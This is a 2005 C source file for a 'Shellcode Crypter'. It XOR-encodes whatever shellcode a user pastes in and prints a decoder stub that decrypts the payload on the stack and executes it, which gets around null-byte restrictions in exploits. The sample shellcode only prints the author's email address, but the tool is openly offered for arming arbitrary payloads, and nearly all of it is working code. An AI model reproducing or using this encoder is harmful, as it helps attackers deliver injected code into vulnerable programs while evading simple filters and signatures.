/*
 *	Shellcode Crypter (Linux _ Windows) (?!?) ALPHA_beta
 *		Coded by Shen139	21-01-2005 - 13:00
 *		shen139 (at) eviltime [dot] c0m
 *
 * ...
 * //PUT HERE YOUR SHELLCODE
 * char shellcode[]="\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x6a\x0a\x68\x2e\x63\x6f\x6d\x68\x74\x69\x6d"
 * "\x65\x68\x65\x76\x69\x6c\x68\x31\x33\x39\x40\x68\x73\x68\x65\x6e\x89\xe1\xb2\x15\xb0\x04\xcd\x80\x31"
 * "\xc0\x31\xdb\xb0\x01\xcd\x80\xc3\x90\x90";
 * ...
 * 
 * Put tHERE your shellcode, then run the program and copy the output! That's your shellcode:
 * crypted and incapsulated into a decrypter that decrypt it into the stack and then execute it!
 *
 * -[...You won't worry anymore for 0x00 in your shellcode...]-
 *
 * Enjoy :D
 *
 */

//PUT HERE YOUR SHELLCODE
char shellcode[]="\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x6a\x0a\x68\x2e\x63\x6f\x6d\x68\x74\x69\x6d"
"\x65\x68\x65\x76\x69\x6c\x68\x31\x33\x39\x40\x68\x73\x68\x65\x6e\x89\xe1\xb2\x15\xb0\x04\xcd\x80\x31"
"\xc0\x31\xdb\xb0\x01\xcd\x80\xc3\x90\x90";

//Set SHELLCODE_LENGHT with 0 if your shellcode does not contain \x00
// otherwise set it with the lenght of the shellcode
#define SHELLCODE_LENGHT	0

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define MAGIC_SUFFIX_PARTa		"\\x33\\xC9\\x8B\\xDC\\x80\\x33"
#define	MAGIC_SUFFIX_PARTb		"\\x43\\x41\\x83\\xF9"
#define MAXIC_SUFFIX_PARTc		"\\x75\\xF6\\x54\\xC3"


int main()
{
char*flShellcode=(char*)malloc(sizeof(shellcode)+4);
int i,b,SLLen,xor,found;

	printf("Shellcode Crypter\n Coded by Shen139\n  shen139 (at) eviltime [dot] com\n\n\n");

// stage1

	SLLen=(SHELLCODE_LENGHT==0)?strlen(shellcode):SHELLCODE_LENGHT;

	memcpy(flShellcode,shellcode,SLLen);

	for(xor=1;xor<=0xFF;xor++)
	{
		found=1;
		for(b=0;b<SLLen;b++)
		{
			if(flShellcode[b]==xor)
			{
				found=0;
				break;
			}
		}
		if(found==1)
			break;
	}

	printf(" - Xoring with 0x%X\n\n\n - Shellcode:\n\n",xor);

// stage2

	while(SLLen%4!=0)
		flShellcode[SLLen++]=	(unsigned char)0x90;

// stage3

	for(i=SLLen-4;i>=0;i-=4)
	{
		printf("\\x68");

		for(b=0;b<4;b++)
			printf("\\x%X",(unsigned char)shellcode[i+b]^xor);
	}

// stage4

	printf(MAGIC_SUFFIX_PARTa);

	printf("\\x%X",xor);

	printf(MAGIC_SUFFIX_PARTb);

	printf("\\x%X",(unsigned char)strlen(shellcode));

	printf(MAXIC_SUFFIX_PARTc);

	printf("\n\n");

return 0;
}

/*EOF*/



